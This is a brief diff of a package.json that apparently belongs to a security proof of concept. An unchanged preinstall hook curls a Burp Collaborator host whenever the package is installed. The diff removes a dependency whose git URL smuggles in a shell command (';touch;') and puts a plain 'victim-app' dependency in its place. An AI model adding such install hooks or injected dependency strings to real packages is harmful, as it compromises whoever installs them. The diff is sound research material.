@@ -10,7 +10,7 @@
     "preinstall":"echo EVIL PACKAGE PREINSTALL; curl http://szvk5zzm4znlqxwjfkloa2pzlqrif7.burpcollaborator.net/ok"
   },
   "dependencies": {
-    "no1zy-evil-sample":"git+https://github.com/No1zy/a;touch;"
+    "victim-app":"git+https://github.com/No1zy/victim-app"
   },
   "repository": {
     "type": "git",
